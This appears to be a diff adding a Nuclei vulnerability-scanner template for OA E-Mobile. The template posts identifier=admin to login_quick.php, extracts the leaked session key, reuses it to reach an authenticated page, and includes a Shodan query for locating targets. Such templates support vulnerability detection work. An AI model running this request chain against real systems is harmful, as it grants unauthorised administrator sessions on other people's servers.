@@ -1,0 +1,40 @@
+id: weaver-login-sessionkey
+
+info:
+  name: OA E-Mobile login_quick.php - Login SessionKey
+  author: SleepingBag945
+  severity: high
+  description: login_quick.php in OA E-Mobile leaks session key.
+  metadata:
+    max-request: 2
+    shodan-query: http.html:"E-Mobile"
+  tags: weaver,e-mobile,oa,vuln
+
+http:
+  - raw:
+      - |
+        POST /E-mobile/App/System/Login/login_quick.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        identifier=admin
+      - |
+        GET /E-mobile/App/Init.php?m=all_Create&detailid=&fromid=&sessionkey={{timestamp}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: timestamp
+        internal: true
+        group: 1
+        regex:
+          - '\"sessionkey\":\"(.*?)\"'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'{{timestamp}}')"
+          - "status_code_2 == 200 && contains(body_2,'<title>新建')"
+        condition: and
+# digest: 490a00463044022071231ee9505bee1352b7f7562214f50ac0a20228cf9fcfcb771f35d5c033885a02200a2732f9c662bc3d7e36588e63d5ce42b8de82d1532468352b79517ed6d218ba:922c64590222798bb761d5b6d8e72950
